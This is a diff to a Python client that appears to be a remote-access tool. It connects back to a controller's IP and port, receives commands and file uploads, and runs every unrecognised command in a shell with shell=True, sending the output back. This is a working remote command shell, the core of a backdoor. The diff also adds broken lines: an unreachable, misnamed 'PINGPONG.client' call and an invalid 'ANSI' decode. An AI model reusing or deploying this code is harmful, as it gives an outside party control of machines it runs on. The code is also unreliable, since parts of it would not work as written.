@@ -18,19 +18,25 @@ def PINGPONG_client(ip, port):
         data = s.recv(1024)
         if data.decode() == "CMDSHELL_APP":
             s.send(bytes("OK", 'utf8'))
+            s.close()
             CMD_client(ip, 8625)
+            break
         if data.decode() == "UPLOAD_APP":
             s.send(bytes("OK", 'utf8'))
             dir_data = s.recv(1024).decode()
             while True:
                 name_data = s.recv(1024).decode()
+                upload_data = ""
                 if name_data == "END":
                     break
                 s.send(bytes("OK", "UTF8"))
                 while True:
-                    upload_data = ""
-                    u_data = s.recv(1024).decode()
-                    upload_data += u_data
+                    try:
+                        u_data = s.recv(1024).decode("utf8")
+                        upload_data += u_data
+                    except:
+                        u_data = s.recv(1024).decode("ANSI")
+                        upload_data += u_data
                     if len(u_data) < 1024:
                         break 
                 if upload_data:
@@ -59,16 +65,18 @@ def CMD_client(ip, port):
         sys.exit(1)
     while True:
         cmd_command = cmd_c.recv(1024)
-        if cmd_command == "exit":
+        if cmd_command.decode("utf8") == "exit":
             break
-        if cmd_command == "PING":
-            cmd_c.send(ip + ">PONG")
-        cmd = subprocess.Popen(cmd_command.decode(
-            "utf8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        cmd_print_out = cmd.stdout.read()
-        if not cmd_print_out:
-            cmd_print_out = cmd.stderr.read()
-        cmd_c.send(cmd_print_out)
+            PINGPONG.client(ip, port)
+        elif cmd_command.decode("utf8") == "PING":
+            cmd_c.send(bytes("PONG", "utf8"))
+        else:
+            cmd = subprocess.Popen(cmd_command.decode(
+                "utf8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            cmd_print_out = cmd.stdout.read()
+            if not cmd_print_out:
+                cmd_print_out = cmd.stderr.read()
+            cmd_c.send(cmd_print_out)
     cmd_c.close()
 
 
